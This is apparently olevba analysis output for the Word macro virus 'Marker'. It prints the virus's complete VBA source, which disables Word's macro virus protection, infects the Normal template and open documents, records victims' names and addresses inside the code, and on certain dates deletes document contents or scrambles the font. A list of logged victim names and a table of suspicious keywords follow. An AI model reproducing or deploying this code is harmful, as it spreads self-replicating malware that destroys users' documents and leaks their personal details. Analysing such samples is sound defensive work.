olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fq2-be792651e6c9585c3f1d46a6e3338b89c0dc06cb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.fq2-be792651e6c9585c3f1d46a6e3338b89c0dc06cb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
    
    Options.VirusProtection = True
    Options.SaveNormalPrompt = True
    Const OldMarker = "<- this is another marker!"
    Const Marker = "WebMaster"
    
    Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
    Dim ad, nt As Object
    
    Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
    Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
    
    DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
    NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)
    
    If (Day(Now()) = 15) And (Month(Now()) Mod 2 = 0) Then
        ActiveDocument.Select
        Selection.Cut
        ActiveDocument.Save
    ElseIf (Day(Now()) = 13) Then
        ActiveDocument.Select
        Selection.Font.Name = "Webdings"
        ActiveDocument.Save
    End If

    'Make sure that some conditions are true before we continue infecting anything
    If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
        (ActiveDocument.SaveFormat = wdFormatDocument Or _
        ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
        'Infect the NormalTemplate
        If DocumentInfected = True Then
  
            SaveNormalTemplate = NormalTemplate.Saved
  
            OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

            'Write a log file of this NormalTemplate infection
            For i = 1 To Len(Application.UserAddress)
                If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
                    If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
                        UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
                    End If
                Else
                    UserAddress = UserAddress & Chr(13) & "' "
                End If
            Next i

            OurCode = OurCode & Chr(13) & _
                      "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                      Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
                      "' " & Application.UserName & Chr(13) & _
                      "' " & UserAddress & Chr(13)

            nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
            nt.CodeModule.AddFromString OurCode
    
            If SaveNormalTemplate = True Then NormalTemplate.Save
    
        End If


        'Infect the ActiveDocument
        If NormalTemplateInfected = True And _
            (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
             ActiveDocument.Saved = False) Then
  
            SaveDocument = ActiveDocument.Saved
    
            OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

            ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
            ad.CodeModule.AddFromString OurCode
    
            If SaveDocument = True Then ActiveDocument.Save
      
        End If
  
    End If
End Sub

Private Sub Document_Open()
    
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    
    Const OldMarker = "<- this is another marker!"
    Const Marker = "WebMaster"
    
    Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
    Dim ad, nt As Object
    
    Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
    Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
    
    DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
    NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)
    
    If (Day(Now()) = 15) And (Month(Now()) Mod 2 = 0) Then
        ActiveDocument.Select
        Selection.Cut
        ActiveDocument.Save
    ElseIf (Day(Now()) = 13) Then
        ActiveDocument.Select
        Selection.Font.Name = "Webdings"
        ActiveDocument.Save
    End If

    'Make sure that some conditions are true before we continue infecting anything
    If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
        (ActiveDocument.SaveFormat = wdFormatDocument Or _
        ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
        'Infect the NormalTemplate
        If DocumentInfected = True Then
  
            SaveNormalTemplate = NormalTemplate.Saved
  
            OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

            'Write a log file of this NormalTemplate infection
            For i = 1 To Len(Application.UserAddress)
                If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
                    If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
                        UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
                    End If
                Else
                    UserAddress = UserAddress & Chr(13) & "' "
                End If
            Next i

            OurCode = OurCode & Chr(13) & _
                      "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                      Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
                      "' " & Application.UserName & Chr(13) & _
                      "' " & UserAddress & Chr(13)

            nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
            nt.CodeModule.AddFromString OurCode
    
            If SaveNormalTemplate = True Then NormalTemplate.Save
    
        End If


        'Infect the ActiveDocument
        If NormalTemplateInfected = True And _
            (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
             ActiveDocument.Saved = False) Then
  
            SaveDocument = ActiveDocument.Saved
    
            OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

            ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
            ad.CodeModule.AddFromString OurCode
    
            If SaveDocument = True Then ActiveDocument.Save
      
        End If
  
    End If
End Sub


' 05:58:46 PM - Sunday, 11 Apr 1999
' USER19
'



' 04:17:17 PM - Thursday, 27 May 1999
' AA
'



' 09:54:40 AM - Thursday, 10 Jun 1999
' TOM GEORGE
'



' 02:09:37 PM - Thursday, 10 Jun 1999
' TINA
'



' 05:53:58 PM - Friday, 25 Jun 1999
' Biju
'



' 12:16:19 PM - Wednesday, 30 Jun 1999
' abc
'



' 03:50:23 PM - Monday, 12 Jul 1999
' EDP_COMP2
'



' 03:29:53  - ïÿòíèöà, 30 èþë 1999
' Ivan A. Teblyashkin
'



' 08:37:05  - Freitag, 20 Jul 2001
' Andreas Marx
'


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

